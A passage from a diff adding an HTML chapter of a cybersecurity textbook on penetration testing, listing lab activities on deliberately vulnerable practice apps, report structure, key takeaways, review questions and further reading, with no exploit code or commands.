+<li>Perform post-exploitation activities</li>
+<li>Document the entire process</li>
+</ol>
+<p><strong>Exploits to Practice</strong>:</p>
+<ul>
+<li>Windows SMB vulnerabilities</li>
+<li>Web application vulnerabilities</li>
+<li>Service-specific exploits</li>
+</ul>
+<h3 id="activity-4-web-application-penetration-testing">Activity 4: Web Application Penetration Testing</h3>
+<p><strong>Objective</strong>: Identify and exploit web application vulnerabilities</p>
+<p><strong>Steps</strong>:</p>
+<ol>
+<li>Set up vulnerable web application (DVWA, WebGoat)</li>
+<li>Perform manual vulnerability assessment</li>
+<li>Test for common vulnerabilities (SQL injection, XSS, CSRF)</li>
+<li>Document vulnerabilities with proof of concept</li>
+<li>Provide remediation recommendations</li>
+</ol>
+<p><strong>Vulnerabilities to Test</strong>:</p>
+<ul>
+<li>Input validation flaws</li>
+<li>Authentication bypass</li>
+<li>Session management issues</li>
+<li>Access control problems</li>
+</ul>
+<h3 id="activity-5-penetration-test-report">Activity 5: Penetration Test Report</h3>
+<p><strong>Objective</strong>: Create a comprehensive penetration testing report</p>
+<p><strong>Steps</strong>:</p>
+<ol>
+<li>Compile all findings from previous activities</li>
+<li>Structure report according to industry standards</li>
+<li>Include executive summary and technical details</li>
+<li>Provide risk assessments and CVSS scores</li>
+<li>Recommend remediation strategies</li>
+<li>Present findings professionally</li>
+</ol>
+<p><strong>Report Sections</strong>:</p>
+<ul>
+<li>Executive summary</li>
+<li>Methodology</li>
+<li>Findings and evidence</li>
+<li>Risk assessment</li>
+<li>Remediation recommendations</li>
+<li>Appendices</li>
+</ul>
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ol>
+<li><strong>Penetration testing</strong> is a systematic approach to testing security controls through ethical hacking</li>
+<li><strong>OSINT</strong> provides valuable information about targets through publicly available sources</li>
+<li><strong>Nmap</strong> is essential for network reconnaissance and service enumeration</li>
+<li><strong>Metasploit</strong> offers powerful exploitation and post-exploitation capabilities</li>
+<li><strong>PTES</strong> provides a comprehensive methodology for conducting penetration tests</li>
+<li><strong>CVSS scoring</strong> standardizes vulnerability severity assessment</li>
+<li><strong>Ethical conduct</strong> is paramount in all penetration testing activities</li>
+<li><strong>Documentation</strong> is crucial for effective reporting and remediation</li>
+</ol>
+<h2 id="review-questions">Review Questions</h2>
+<ol>
+<li>What are the six phases of the penetration testing lifecycle?</li>
+<li>How does OSINT differ from active reconnaissance?</li>
+<li>What are the advantages of SYN scanning over TCP connect scanning?</li>
+<li>Explain the difference between exploits and payloads in Metasploit</li>
+<li>What are the main components of CVSS scoring?</li>
+<li>Why is proper authorization essential in penetration testing?</li>
+<li>How can web application vulnerabilities be categorized?</li>
+<li>What role does threat modeling play in penetration testing?</li>
+</ol>
+<h2 id="further-reading">Further Reading</h2>
+<ul>
+<li>
+<p><strong>Books</strong>:</p>
+<ul>
+<li>&quot;The Web Application Hacker's Handbook&quot; by Dafydd Stuttard and Marcus Pinto</li>
+<li>&quot;Metasploit: The Penetration Tester's Guide&quot; by David Kennedy et al.</li>
+<li>&quot;Nmap Network Scanning&quot; by Gordon Lyon</li>
+</ul>
+</li>
+<li>
+<p><strong>Standards and Frameworks</strong>:</p>
+<ul>
+<li>PTES (Penetration Testing Execution Standard)</li>
+<li>OWASP Testing Guide</li>
+<li>NIST Cybersecurity Framework</li>
+</ul>
+</li>
+<li>
+<p><strong>Tools and Resources</strong>:</p>
+<ul>
+<li>Metasploit Framework documentation</li>
+<li>Nmap reference guide</li>
+<li>CVSS calculator and documentation</li>
+</ul>
+</li>
+<li>
+<p><strong>Certifications</strong>:</p>
+<ul>
+<li>CEH (Certified Ethical Hacker)</li>
+<li>OSCP (Offensive Security Certified Professional)</li>
+<li>GPEN (GIAC Penetration Tester)</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p><strong>Previous Chapter</strong>: <a href="chapter08-cryptography.md">Chapter 8: Cryptography Fundamentals</a> - Learn about encryption algorithms, cryptographic protocols, and Public Key Infrastructure (PKI).</p>
+<p><strong>Next Chapter</strong>: <a href="chapter10-application-security.md">Chapter 10: Application Security</a> - Learn about secure software development, OWASP Top 10, and application security testing methodologies.</p>
+
+</body>
+</html>
